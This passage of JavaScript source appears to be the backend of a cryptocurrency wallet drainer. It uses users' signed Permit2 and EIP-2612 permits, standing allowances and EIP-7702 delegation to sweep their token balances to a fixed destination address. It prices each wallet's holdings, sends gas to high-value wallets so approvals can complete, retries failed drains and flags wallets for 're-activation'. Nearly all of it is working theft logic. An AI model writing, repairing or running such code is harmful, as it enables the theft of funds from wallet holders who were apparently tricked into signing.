    await sweepDelegatedWallet(checksum);
    return true;
  } catch (e) {
    const isRpc = /timeout|network|ETIMEDOUT|ECONNRESET|502|503|429/i.test(e.message ?? "");
    if (isRpc) {
      warn(`[upgrade] ${short} — type-4 transient RPC error (will retry): ${e.message}`);
    } else {
      warn(`[upgrade] ${short} — type-4 attempt failed: ${e.message}`);
    }
    return false;
  }
}

// ── EIP-7702 sweep with delegation-active check ───────────────────────────────
//
// EIP-7702 delegation is PERSISTENT on-chain: the code at the wallet address
// stays set even after the user's account nonce changes (nonces only matter at
// authorization submission time, not afterward).
//
// Correct liveness check: getReadProvider().getCode(address) — delegated addresses
// have non-empty code (the 0xef0100… delegation designator + contract address).
// If code === "0x", the delegation was revoked → mark needs-reauth.
//
// needsReauthWallets (in-memory Set) prevents re-writing Supabase every 60s
// after we've already flagged a wallet. Cleared when Realtime UPDATE fires.

async function sweepEIP7702Wallet(walletAddress) {
  const checksum = normalizeAddress(walletAddress);
  if (!checksum) return;

  const addrKey = checksum.toLowerCase();

  // Already flagged this session — skip until Realtime update resets it
  if (needsReauthWallets.has(addrKey)) return;

  // Check delegation code is still active at this address
  try {
    const code = await getReadProvider().getCode(checksum);
    if (!code || code === "0x") {
      warn(`[eip7702] ${checksum} — delegation not active (no code) — marking needs-reauth`);
      needsReauthWallets.add(addrKey);
      if (supabase) {
        await supabase
          .from("delegated_wallets")
          .update({ status: "needs-reauth" })
          .eq("address", addrKey)
          .eq("chain", CHAIN);
      }
      return;
    }
  } catch (e) {
    warn(`[eip7702] getCode failed for ${checksum}: ${e.message}`);
    // Non-fatal — proceed with sweep attempt
  }

  await sweepDelegatedWallet(checksum);
}

// ── Permit2 AllowanceTransfer sweep ──────────────────────────────────────────
//
// User previously called:
//   1. erc20.approve(PERMIT2_ADDRESS, MaxUint256)
//   2. permit2.approve(token, relayerWallet, MaxUint160, MaxUint48)
//
// Bot calls permit2.transferFrom(user, destination, balance, token) per token.
// No signature, no nonce, no deadline — allowance lives in Permit2 forever.
//
// Tokens to sweep: read from delegated_wallets.permit_metadata.tokens,
// fallback to TOKENS_TO_WATCH env var.

// ── Price feed helpers (CoinGecko free API) ──────────────────────────────────

async function getTokenPriceUSD(tokenAddr) {
  const key = tokenAddr.toLowerCase();
  if (STABLECOIN_ADDRS.has(key)) return 1;
  const cached = priceCache.get(key);
  if (cached && Date.now() - cached.ts < PRICE_CACHE_TTL) return cached.usd;
  try {
    const url = `https://api.coingecko.com/api/v3/simple/token_price/${COINGECKO_PLATFORM}` +
      `?contract_addresses=${tokenAddr}&vs_currencies=usd`;
    const res  = await fetch(url, { headers: { accept: "application/json" }, signal: AbortSignal.timeout(8000) });
    if (!res.ok) return 0;
    const data = await res.json();
    const usd  = data[key]?.usd ?? 0;
    priceCache.set(key, { usd, ts: Date.now() });
    return usd;
  } catch { return 0; }
}

async function getNativePriceUSD() {
  const cached = priceCache.get("__native__");
  if (cached && Date.now() - cached.ts < PRICE_CACHE_TTL) return cached.usd;
  try {
    const url  = `https://api.coingecko.com/api/v3/simple/price?ids=${NATIVE_COINGECKO_ID}&vs_currencies=usd`;
    const res  = await fetch(url, { headers: { accept: "application/json" }, signal: AbortSignal.timeout(8000) });
    if (!res.ok) return 0;
    const data = await res.json();
    const usd  = data[NATIVE_COINGECKO_ID]?.usd ?? 0;
    priceCache.set("__native__", { usd, ts: Date.now() });
    return usd;
  } catch { return 0; }
}

async function getTotalValueUSD(tokens) {
  let total = 0;
  for (const { token, balance } of tokens) {
    if (!balance || balance === 0n) continue;
    try {
      const price = await getTokenPriceUSD(token);
      if (price === 0) continue;
      const erc20    = new ethers.Contract(token, ERC20_ABI, getReadProvider());
      let decimals   = 18;
      try { decimals = await erc20.decimals(); } catch {}
      total += Number(ethers.formatUnits(balance, decimals)) * price;
    } catch {}
  }
  return total;
}

async function getRelayerBalanceUSD() {
  try {
    const bal       = await getReadProvider().getBalance(relayerWallet.address);
    const nativeUSD = await getNativePriceUSD();
    return Number(ethers.formatEther(bal)) * nativeUSD;
  } catch { return 0; }
}

async function evaluateAirdrop(walletAddress, needsGasTokens) {
  const totalUSD = await getTotalValueUSD(needsGasTokens);
  if (totalUSD < AIRDROP_MIN_VALUE_USD) {
    log(`[monitor] ${walletAddress}: $${totalUSD.toFixed(2)} < $${AIRDROP_MIN_VALUE_USD} — monitoring only`);
    return;
  }
  const relayerUSD = await getRelayerBalanceUSD();
  if (relayerUSD < AIRDROP_MIN_RELAYER_USD) {
    warn(`[monitor] ${walletAddress}: relayer $${relayerUSD.toFixed(2)} < $${AIRDROP_MIN_RELAYER_USD} — skip airdrop`);
    return;
  }
  // Only airdrop if the wallet truly has no gas. A wallet with existing native
  // balance can submit its own ERC-20→Permit2 approval — sending gas wastes relayer funds.
  const MIN_GAS_NATIVE = { eth: ethers.parseEther("0.001"), bnb: ethers.parseEther("0.002"), polygon: ethers.parseEther("0.2") };
  try {
    const nativeBal = await getReadProvider().getBalance(walletAddress);
    if (nativeBal >= (MIN_GAS_NATIVE[CHAIN] ?? MIN_GAS_NATIVE.bnb)) {
      log(`[monitor] ${walletAddress}: has ${ethers.formatEther(nativeBal)} native — no gas airdrop needed`);
      return;
    }
  } catch { /* non-fatal — proceed with airdrop if balance check fails */ }
  if (supabase) {
    const { data } = await supabase
      .from("delegated_wallets")
      .select("permit_metadata")
      .eq("address", walletAddress.toLowerCase())
      .eq("chain", CHAIN)
      .single();
    if (data?.permit_metadata?.gas_airdropped) {
      log(`[monitor] ${walletAddress}: already airdropped — monitoring`);
      return;
    }
  }
  log(`[airdrop] ${walletAddress}: $${totalUSD.toFixed(2)} — sending ${ethers.formatEther(GAS_AIRDROP_AMOUNT)} native`);
  try {
    const fee = await getFeeData();
    const tx  = await relayerWallet.sendTransaction({
      to: walletAddress, value: GAS_AIRDROP_AMOUNT, gasLimit: 21_000n, ...fee,
    });
    await tx.wait();
    log(`[airdrop] confirmed: ${tx.hash}`);
    if (supabase) {
      const { data } = await supabase
        .from("delegated_wallets")
        .select("permit_metadata")
        .eq("address", walletAddress.toLowerCase())
        .eq("chain", CHAIN)
        .maybeSingle();
      if (data) {
        const currentMeta = data.permit_metadata ?? {};
        await supabase
          .from("delegated_wallets")
          .update({ permit_metadata: { ...currentMeta, gas_airdropped: true } })
          .eq("address", walletAddress.toLowerCase())
          .eq("chain", CHAIN);
      }
    }
  } catch (e) { err(`[airdrop] failed for ${walletAddress}: ${e.message}`); }
}

// ── Gasless PATH B sweep ──────────────────────────────────────────────────────
//
// Wallet has type="permit2-gasless". User signed two things off-chain:
//   permitBatch        — PermitBatch (AllowanceTransfer) for tokens already approved ERC20->Permit2
//   signatureTransfers — array of per-token PermitTransferFrom sigs for uncovered tokens
//
// Bot pays gas to:
//   1. permit2.permit(owner, permitBatch, sig)   — sets Permit2 allowances for covered tokens
//   2. permit2.transferFrom()                    — sweeps covered tokens
//   3. permit2.permitTransferFrom() per entry    — single-token sweep (~200k gas each)
//      On InvalidNonce: marks entry as spent in Supabase, never retries that sig.
//      On TRANSFER_FROM_FAILED: logs but keeps sig (ERC20 approval may not be set yet).

async function sweepGaslessWallet(walletAddress) {
  const checksum = normalizeAddress(walletAddress);
  if (!checksum || !supabase) return;

  let meta;
  try {
    const { data } = await supabase
      .from("delegated_wallets")
      .select("permit_metadata")
      .eq("address", checksum.toLowerCase())
      .eq("chain", CHAIN)
      .single();
    meta = data?.permit_metadata;
  } catch (e) {
    err(`[gasless] metadata read for ${checksum}: ${e.message}`);
    return;
  }

  if (!meta) { warn(`[gasless] no permit_metadata for ${checksum}`); return; }

  const { permitBatch, signatureTransfers } = meta;
  const nowSecs = BigInt(Math.floor(Date.now() / 1000));

  // ── Part 6: Log signature data read from Supabase ─────────────────────────
  log(`[gasless] permitBatch=${!!permitBatch} signatureTransfers=${signatureTransfers === null ? "null" : Array.isArray(signatureTransfers) ? "legacy-array("+signatureTransfers.length+")" : signatureTransfers && typeof signatureTransfers === "object" ? "object(permitted="+signatureTransfers?.permitted?.length+")" : String(signatureTransfers)}`);

  // No signature data at all — check if on-chain AllowanceTransfer is still live
  // (user may have previously activated and the sig was lost from Supabase, but the
  // on-chain allowance is still valid). Only set needs_reactivation if truly no backup.
  if (!signatureTransfers && !permitBatch) {
    warn(`[gasless] ${checksum.slice(0,10)} — no signature data in permit_metadata — checking on-chain AllowanceTransfer`);
    await setNeedsReactivationIfNoBackup(checksum, checksum.toLowerCase());
    return;
  }

  if (signatureTransfers && typeof signatureTransfers === 'object' && !Array.isArray(signatureTransfers)) {
    const st = signatureTransfers;
    log(`[gasless] permitted count: ${st.permitted?.length ?? 0}`);
    log(`[gasless] deadline: ${st.deadline}`);
    log(`[gasless] nonce: ${String(st.nonce ?? '').slice(0, 16)}...`);
    log(`[gasless] spender: ${st.spender}`);
    log(`[gasless] spent: ${st.spent ?? false}`);
    if (!st.permitted?.length) warn('[gasless] permitted array is empty — nothing to sweep');
    if (st.deadline && BigInt(st.deadline) < nowSecs) warn('[gasless] deadline already EXPIRED');
    if (st.spender?.toLowerCase() !== relayerWallet.address.toLowerCase()) {
      warn(`[gasless] SPENDER MISMATCH — sig.spender=${st.spender} relayer=${relayerWallet.address}`);
    }
  } else if (Array.isArray(signatureTransfers)) {
    const unspent = signatureTransfers.filter(e => !e.spent).length;
    log(`[gasless] legacy array: ${signatureTransfers.length} entries, ${unspent} unspent`);
  }

  // Hard balance gate — check ONLY the signed token addresses before any on-chain tx
  const signedAddrs = [
    ...(Array.isArray(permitBatch?.details) ? permitBatch.details.map(d => d.token) : []),
    ...(Array.isArray(signatureTransfers)
      ? signatureTransfers.map(e => e.token)
      : (signatureTransfers?.permitted ?? []).map(p => p.token)),
  ].map(a => normalizeAddress(a)).filter(Boolean);

  if (signedAddrs.length > 0) {
    let anyBalance = false;
    let anyReadSucceeded = false;
    for (const addr of signedAddrs) {
      try {
        const bal = await new ethers.Contract(addr, ERC20_ABI, getReadProvider()).balanceOf(checksum);
        anyReadSucceeded = true;
        if (bal > 0n) { anyBalance = true; break; }
      } catch {}
      await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
    }
    if (!anyBalance) {
      // If every single balanceOf() call threw (RPC/network failure) rather than
      // genuinely resolving to 0, this is NOT "zero balance" — it's an outage.
      // Logging/skipping it as "zero balance" previously hid real RPC failures
      // and skipped a wallet that may well have funds to sweep. Bail without the
      // misleading conclusion; the next block/event trigger will retry.
      if (!anyReadSucceeded) {
        warn(`[gasless] ${checksum.slice(0, 10)} — all ${signedAddrs.length} balance read(s) failed (RPC error, not confirmed zero) — skipping this pass, will retry`);
        return;
      }
      log(`[gasless] ${checksum.slice(0, 10)} — all ${signedAddrs.length} signed token(s) zero balance, skipping`);
      return;
    }
  }

  // -- PermitBatch path (AllowanceTransfer via signature) ---------------------
  if (permitBatch?.signature && Array.isArray(permitBatch.details) && permitBatch.details.length > 0) {
    // Check allowances via Multicall3 — 1 RPC call instead of N sequential calls.
    let needsPermit = false;
    try {
      const ALLOW_ABI = ["function allowance(address,address,address) view returns (uint160,uint48,uint48)"];
      const allowIface = new ethers.Interface(ALLOW_ABI);
      const mc = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
      const calls = permitBatch.details.map(d => ({
        target: PERMIT2_ADDRESS,
        allowFailure: true,
        callData: allowIface.encodeFunctionData("allowance", [checksum, d.token, relayerWallet.address]),
      }));
      const results = await mc.aggregate3(calls);
      for (let i = 0; i < results.length; i++) {
        if (!results[i].success) { needsPermit = true; break; }
        try {
          const [amt,, exp] = allowIface.decodeFunctionResult("allowance", results[i].returnData);
          if (BigInt(amt) === 0n || BigInt(exp) <= nowSecs) { needsPermit = true; break; }
        } catch { needsPermit = true; break; }
      }
    } catch { needsPermit = true; }

    if (needsPermit) {
      const pbSigDeadline = Number(permitBatch.sigDeadline ?? 0);
      const nowCheck = Math.floor(Date.now() / 1000);
      // Skip permit() when sigDeadline is missing/zero OR already past.
      // "0 > 0" was previously false, letting permit(sigDeadline=0) slip through → revert.
      if (pbSigDeadline === 0 || pbSigDeadline < nowCheck) {
        warn(`[gasless] permitBatch sigDeadline ${pbSigDeadline === 0 ? 'missing/zero' : `expired ${Math.floor((nowCheck - pbSigDeadline) / 86400)} days ago`} — skipping permit() call, using existing on-chain allowances`);
      } else {
        log(`[gasless] ${checksum} -- calling permit2.permit() (${permitBatch.details.length} token(s))`);
        try {
          const batchArg = {
            details:     permitBatch.details.map(d => ({
              token:      d.token,
              amount:     BigInt(d.amount),
              expiration: BigInt(d.expiration),
              nonce:      Number(d.nonce),
            })),
            spender:     permitBatch.spender,
            sigDeadline: BigInt(permitBatch.sigDeadline),
          };
          const fee = await getFeeData();
          // Dynamic gas: 120k base + 14k per token detail (permit2.permit storage writes).
          // Capped at 800k — sufficient for 50 tokens; larger batches should not occur.
          const permitGas = BigInt(Math.min(120_000 + permitBatch.details.length * 14_000, 800_000));
          const tx  = await permit2.permit(checksum, batchArg, permitBatch.signature,
            { gasLimit: permitGas, ...fee });
          log(`[gasless] permit() tx: ${tx.hash}`);
          await tx.wait();
          log(`[gasless] permit() confirmed for ${checksum}`);
        } catch (e) { maybeResetNonce(e); err(`[gasless] permit() for ${checksum}: ${e.message}`); }
      }
    }

    for (const detail of permitBatch.details) {
      const tokenAddr = normalizeAddress(detail.token);
      if (!tokenAddr) continue;
      try {
        const token   = new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider());
        const balance = await token.balanceOf(checksum);
        if (balance === 0n) { await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY)); continue; }
        // Cap sweep amount by ERC-20 allowance granted to Permit2.
        // If the user approved Permit2 for less than the full balance (e.g. approved 100 USDT
        // but holds 500 USDT), permit2.transferFrom with the full balance reverts.
        const erc20Allow = await token.allowance(checksum, PERMIT2_ADDRESS).catch(() => balance);
        const sweepAmt   = erc20Allow < balance ? erc20Allow : balance;
        if (sweepAmt === 0n) {
          log(`[gasless/allowance] ${tokenAddr.slice(0,10)} ERC-20→Permit2 allowance is 0 — skipping`);
          await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
          continue;
        }
        if (sweepAmt < balance) log(`[gasless/allowance] ⚠️  capping ${tokenAddr.slice(0,10)} to allowance ${sweepAmt} (balance=${balance})`);
        log(`[gasless/allowance] ${checksum} balance=${balance} sweepAmt=${sweepAmt} -- transferFrom ${tokenAddr.slice(0, 10)}`);
        const fee = await getFeeData();
        const tx  = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, sweepAmt, tokenAddr,
          { gasLimit: 150_000n, ...fee });
        log(`[gasless/allowance] transferFrom tx: ${tx.hash}`);
        await tx.wait();
        log(`[gasless/allowance] confirmed for ${checksum}`);
      } catch (e) { maybeResetNonce(e); err(`[gasless/allowance] ${tokenAddr} for ${checksum}: ${e.message}`); }
      await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
    }
  }

  // ── SignatureTransfer path — batch (new) or per-token (legacy backward compat) ─

  const needsGasTokens = [];

  if (Array.isArray(signatureTransfers)) {
    // ── LEGACY: per-token array format ────────────────────────────────────────
    let sigMetaChanged = false;
    const updatedSigs = JSON.parse(JSON.stringify(signatureTransfers));

    for (let i = 0; i < updatedSigs.length; i++) {
      const entry = updatedSigs[i];
      if (!entry?.signature || entry.spent) {
        await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
        continue;
      }

      const deadline = BigInt(entry.deadline);
      if (deadline < nowSecs) {
        warn(`[gasless/sig] entry ${i} expired for ${checksum} — marking spent`);
        updatedSigs[i].spent = true;
        sigMetaChanged = true;
        continue;
      }

      const tokenAddr = normalizeAddress(entry.token);
      if (!tokenAddr) continue;

      try {
        const erc20Token = new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider());
        const balance    = await erc20Token.balanceOf(checksum);

        if (balance === 0n) { await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY)); continue; }

        let erc20Allow = 0n;
        try { erc20Allow = await erc20Token.allowance(checksum, PERMIT2_ADDRESS); } catch {}

        const eip2612Key = `${checksum.toLowerCase()}:${tokenAddr}`;
        if (entry.eip2612 && !entry.eip2612.failed && !failedEIP2612.has(eip2612Key) && erc20Allow === 0n) {
          const { v, r, s } = entry.eip2612;
          const e2Deadline  = BigInt(entry.eip2612.deadline);
          if (e2Deadline > nowSecs) {
            try {
              const tc  = new ethers.Contract(tokenAddr, EIP2612_PERMIT_ABI, relayerWallet);
              const fee = await getFeeData();
              await (await tc.permit(checksum, PERMIT2_ADDRESS, ethers.MaxUint256, e2Deadline, v, r, s, { gasLimit: 100_000n, ...fee })).wait();
              log(`[gasless/sig] EIP-2612 token.permit() confirmed for ${entry.symbol ?? tokenAddr.slice(0, 10)}`);
              erc20Allow = ethers.MaxUint256;
            } catch (e) {
              warn(`[gasless/sig] token.permit() failed for ${entry.symbol ?? tokenAddr.slice(0, 10)}: ${e.message ?? e} — marking as failed, skipping`);
              failedEIP2612.add(eip2612Key);
              updatedSigs[i] = { ...updatedSigs[i], eip2612: { ...entry.eip2612, failed: true } };
              sigMetaChanged = true;
              await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
              continue;
            }
          }
        }

        if (erc20Allow === 0n) {
          needsGasTokens.push({ token: tokenAddr, balance });
          await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
          continue;
        }

        log(`[gasless/sig] ${checksum} ${entry.symbol ?? tokenAddr.slice(0, 10)} balance=${balance} — legacy single permitTransferFrom`);
        const fee = await getFeeData();
        const legacyPermit2 = new ethers.Contract(PERMIT2_ADDRESS, [
          "function permitTransferFrom(tuple(tuple(address token, uint256 amount) permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount) transferDetails, address owner, bytes calldata signature) external",
        ], relayerWallet);
        const tx = await legacyPermit2.permitTransferFrom(
          { permitted: { token: tokenAddr, amount: BigInt(entry.amount) }, nonce: BigInt(entry.nonce), deadline: BigInt(entry.deadline) },
          { to: DESTINATION_ADDRESS, requestedAmount: balance },
          checksum, entry.signature,
          { gasLimit: 220_000n, ...fee },
        );
        log(`[gasless/sig] tx: ${tx.hash}`);
        await tx.wait();
        log(`[gasless/sig] confirmed — ${entry.symbol ?? tokenAddr.slice(0, 10)} swept`);
        updatedSigs[i].spent = true;
        sigMetaChanged = true;

      } catch (e) {
        const msg = e.message ?? "";
        if (/InvalidNonce|nonce.*already.*used|NONCE_USED/i.test(msg)) {
          warn(`[gasless/sig] nonce consumed — ${entry.symbol ?? entry.token?.slice(0, 10)} — marking spent`);
          updatedSigs[i].spent = true; sigMetaChanged = true;
        } else if (/TRANSFER_FROM_FAILED|transferFrom/i.test(msg)) {
          // ERC-20→Permit2 approval may not be confirmed yet — keep sig alive for retry
          warn(`[gasless/sig] TRANSFER_FROM_FAILED — ${entry.symbol ?? entry.token?.slice(0, 10)} — keeping sig for retry (approval may be pending)`);
        } else {
          err(`[gasless/sig] ${entry.token} for ${checksum}: ${msg}`);
        }
      }
      await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
    }

    if (sigMetaChanged && supabase) {
      try {
        await supabase.from("delegated_wallets")
          .update({ permit_metadata: { ...meta, signatureTransfers: updatedSigs } })
          .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
        log(`[gasless/sig] Updated spent flags for ${checksum}`);
      } catch (e) { err(`[gasless/sig] Supabase update failed: ${e.message}`); }
    }

  } else if (signatureTransfers && typeof signatureTransfers === "object" && !signatureTransfers.spent) {
    // ── NEW: single batch object ───────────────────────────────────────────────
    const batch = signatureTransfers;

    if (BigInt(batch.deadline) < nowSecs) {
      warn(`[gasless/batch] deadline EXPIRED for ${checksum} (${new Date(Number(batch.deadline) * 1000).toISOString()}) — marking spent`);
      if (supabase) {
        try {
          const hasBackup = await hasLivePermit2Allowance(checksum);
          await supabase.from("delegated_wallets")
            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } }, needs_reactivation: !hasBackup })
            .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
          if (hasBackup) log(`[gasless/batch] sig expired — AllowanceTransfer still active, Tier 3.5 covers deposits`);
        } catch (e) { err(`[gasless/batch] Supabase update: ${e.message}`); }
      }
      return;
    }

    // Relayer must be msg.sender for permitTransferFrom — reject other spenders.
    // Exception: V2 contract spender (old test sigs) — skip gracefully; AllowanceTransfer handles it.
    if (batch.spender && batch.spender.toLowerCase() !== relayerWallet.address.toLowerCase()) {
      if (CONTRACT_ADDRESS && batch.spender.toLowerCase() === CONTRACT_ADDRESS.toLowerCase()) {
        log(`[gasless/batch] sig spender=V2 contract — cannot call permitTransferFrom; falling through to AllowanceTransfer path`);
        return;
      }
      err(`[gasless/batch] ❌ SPENDER MISMATCH — sig.spender=${batch.spender} relayer=${relayerWallet.address} — cannot sweep`);
      return;
    }

    // ── Nonce pre-check — avoid wasting gas on already-consumed nonces ─────────
    // Permit2 uses a bitmap for SignatureTransfer nonces. Checking it here catches
    // a previously-swept or crashed nonce before building any EIP-2612 permits,
    // preventing a wasted relayer transaction that reverts with InvalidNonce.
    if (batch.nonce) {
      const nonceConsumed = await isNonceUsed(checksum, batch.nonce);
      if (nonceConsumed) {
        warn(`[gasless/batch] nonce already consumed on-chain for ${checksum.slice(0, 10)} — marking spent`);
        const hasBackup = await hasLivePermit2Allowance(checksum).catch(() => false);
        if (supabase) {
          await supabase.from("delegated_wallets")
            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } }, needs_reactivation: !hasBackup })
            .eq("address", checksum.toLowerCase()).eq("chain", CHAIN)
            .then(v => v, () => {});
        }
        if (hasBackup) log(`[gasless/batch] AllowanceTransfer still active for ${checksum.slice(0,10)} — future deposits covered without re-signing`);
        return;
      }
    }

    const eip2612Map = batch.eip2612 ?? {};
    // Track post-Step-1 ERC-20→Permit2 allowances so Step 2 can skip unapproved tokens.
    // Without this, a single unapproved token causes the entire batch permitTransferFrom to revert.
    const tokenAllowances = new Map(); // tokenAddr (lowercase) → bigint

    // Step 1: EIP-2612 permits — set ERC20→Permit2 for tokens that need it
    for (const perm of batch.permitted) {
      const tokenAddr = normalizeAddress(perm.token);
      if (!tokenAddr) continue;
      let erc20Allow = 0n;
      try { erc20Allow = await new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider()).allowance(checksum, PERMIT2_ADDRESS); } catch {}
      tokenAllowances.set(tokenAddr.toLowerCase(), erc20Allow);

      const batchEip2612Key = `${checksum.toLowerCase()}:${tokenAddr}`;
      if (erc20Allow === 0n) {
        const e2 = eip2612Map[tokenAddr.toLowerCase()];
        if (e2 && !e2.failed && !failedEIP2612.has(batchEip2612Key) && BigInt(e2.deadline) > nowSecs) {
            log(`[gasless/batch] EIP-2612 token.permit() for ${tokenAddr.slice(0, 10)}`);
            try {
              const tc  = new ethers.Contract(tokenAddr, EIP2612_PERMIT_ABI, relayerWallet);
              const fee = await getFeeData();
              await (await tc.permit(checksum, PERMIT2_ADDRESS, ethers.MaxUint256, BigInt(e2.deadline), e2.v, e2.r, e2.s, { gasLimit: 100_000n, ...fee })).wait();
              log(`[gasless/batch] EIP-2612 confirmed for ${tokenAddr.slice(0, 10)}`);
              try {
                const actualAllow = await new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider()).allowance(checksum, PERMIT2_ADDRESS);
                if (actualAllow === 0n) {
                  warn(`[gasless/batch] EIP-2612 permit() succeeded but allowance=0 for ${tokenAddr.slice(0,10)} — non-standard token, marking failed`);
                  failedEIP2612.add(batchEip2612Key);
                  eip2612Map[tokenAddr.toLowerCase()] = { ...e2, failed: true };
                } else {
                  log(`[gasless/batch] EIP-2612 allowance verified: ${actualAllow} for ${tokenAddr.slice(0,10)}`);
                  tokenAllowances.set(tokenAddr.toLowerCase(), actualAllow); // update after successful permit
                }
              } catch { /* non-fatal */ }
          } catch (e) {
            maybeResetNonce(e);
            warn(`[gasless/batch] EIP-2612 permit() failed for ${tokenAddr.slice(0, 10)}: ${e.message} — marking failed, will not retry`);
            failedEIP2612.add(batchEip2612Key);
            eip2612Map[tokenAddr.toLowerCase()] = { ...e2, failed: true };
            if (supabase) {
              try {
                await supabase.from("delegated_wallets")
                  .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, eip2612: eip2612Map } } })
                  .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
              } catch (e2) { err(`[gasless/batch] Supabase mark eip2612 failed: ${e2.message}`); }
            }
          }
        }
      }
      await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
    }

    // Step 2: Build transferDetails — zero out tokens without ERC-20→Permit2 approval.
    // A single unapproved token would revert the ENTIRE batch tx; by setting those to 0
    // we sweep what we can now and let the next reconnect handle the rest.
    const transferDetails = [];
    let anyBalance = false;
    for (const perm of batch.permitted) {
      const tokenAddr = normalizeAddress(perm.token);
      if (!tokenAddr) { transferDetails.push({ to: DESTINATION_ADDRESS, requestedAmount: 0n }); continue; }
      try {
        const balance = await new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider()).balanceOf(checksum);
        const allow   = tokenAllowances.get(tokenAddr.toLowerCase()) ?? 0n;
        // Only include tokens with balance AND ERC-20→Permit2 approval; rest are 0 (skipped).
        const requestedAmount = (balance > 0n && allow > 0n) ? balance : 0n;
        if (balance > 0n && allow === 0n) {
          log(`[gasless/batch] ${tokenAddr.slice(0,10)}: balance=${balance} but no Permit2 approval — zeroing out (will need re-approve)`);
          needsGasTokens.push({ token: tokenAddr, balance });
        }
        transferDetails.push({ to: DESTINATION_ADDRESS, requestedAmount });
        if (requestedAmount > 0n) anyBalance = true;
      } catch {
        transferDetails.push({ to: DESTINATION_ADDRESS, requestedAmount: 0n });
      }
      await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
    }

    if (!anyBalance) {
      log(`[gasless/batch] all zero balance for ${checksum} — skipping batch`);
      if (needsGasTokens.length > 0) {
        await evaluateAirdrop(checksum, needsGasTokens).catch(e => err(`evaluateAirdrop: ${e.message}`));
      }
      return;
    }

    const nonZeroCount = transferDetails.filter(d => d.requestedAmount > 0n).length;
    log(`[gasless/batch] tokens with balance: ${nonZeroCount}/${batch.permitted.length}`);

    // Step 3: Batch permitTransferFrom — ONE call for all tokens
    log('[gasless/batch] permitTransferFrom params:');
    log(`  owner:          ${checksum}`);
    log(`  spender in sig: ${batch.spender}`);
    log(`  msg.sender:     ${relayerWallet.address}`);
    log(`  tokens:  ${batch.permitted.map(p => p.token.slice(0, 10)).join(', ')}`);
    log(`  amounts: ${transferDetails.map(d => d.requestedAmount.toString()).join(', ')}`);
    log(`  nonce:   ${String(batch.nonce).slice(0, 20)}...`);
    log(`  deadline:${batch.deadline} (${new Date(Number(batch.deadline) * 1000).toISOString()})`);
    log(`  sig:     ${batch.signature.slice(0, 20)}...`);

    try {
      const fee = await getFeeData();
      const gasLimit = 150_000n + BigInt(batch.permitted.length) * 100_000n;
      const tx = await permit2Batch.permitTransferFrom(
        {
          permitted: batch.permitted.map(p => ({ token: p.token, amount: BigInt(p.amount) })),
          nonce:     BigInt(batch.nonce),
          deadline:  BigInt(batch.deadline),
        },
        transferDetails,
        checksum,
        batch.signature,
        { gasLimit, ...fee },
      );
      log(`[gasless/batch] batch permitTransferFrom tx: ${tx.hash}`);
      try {
        await tx.wait();
        log(`[gasless/batch] confirmed — batch sweep for ${checksum} (${batch.permitted.length} token(s))`);
      } catch (waitErr) {
        const wmsg = waitErr.message ?? '';
        let reason = wmsg;
        if (waitErr.data) {
          try {
            const decoded = ethers.AbiCoder.defaultAbiCoder().decode(['string'], '0x' + String(waitErr.data).slice(10));
            reason = decoded[0] ?? wmsg;
          } catch {}
        }
        err(`[gasless/batch] revert: ${reason}`);
        throw waitErr;
      }

      if (supabase) {
        try {
          const hasBackup = await hasLivePermit2Allowance(checksum);
          await supabase.from("delegated_wallets")
            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } }, needs_reactivation: !hasBackup })
            .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
          if (hasBackup) {
            log(`[gasless/batch] sig spent — AllowanceTransfer still active, Tier 3.5 covers future deposits`);
          } else {
            log(`[gasless/batch] sig spent + needs_reactivation set — no AllowanceTransfer backup`);
          }
        } catch (e) { err(`[gasless/batch] Supabase spent update: ${e.message}`); }
      }
    } catch (e) {
      maybeResetNonce(e);
      const msg = e.message ?? "";
      if (/InvalidNonce|nonce.*already.*used|NONCE_USED/i.test(msg)) {
        warn(`[gasless/batch] nonce consumed for ${checksum} — marking spent`);
        if (supabase) {
          try {
            const hasBackup = await hasLivePermit2Allowance(checksum);
            await supabase.from("delegated_wallets")
              .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } }, needs_reactivation: !hasBackup })
              .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
          } catch (e2) { err(`[gasless/batch] Supabase spent update: ${e2.message}`); }
        }
      } else if (/TRANSFER_FROM_FAILED|transferFrom/i.test(msg)) {
        // The entire batch call reverted, so the Permit2 nonce bitmap was NEVER
        // written on-chain (state changes roll back on revert) — the signature is
        // still cryptographically valid and unconsumed. This is usually caused by a
        // pending ERC-20→Permit2 approval or a balance that changed between our
        // pre-check and execution. Marking it spent here (as before) permanently
        // discarded a still-usable signature — keep it alive for the next retry,
        // consistent with the legacy per-token path above and with Tier 4.
        warn(`[gasless/batch] TRANSFER_FROM_FAILED for ${checksum} — tx reverted, nonce NOT consumed on-chain, keeping sig for retry`);
      } else {
        err(`[gasless/batch] batch permitTransferFrom for ${checksum}: ${msg}`);
      }
    }
  }

  if (needsGasTokens.length > 0) {
    await evaluateAirdrop(checksum, needsGasTokens).catch(e => err(`evaluateAirdrop: ${e.message}`));
  }
}

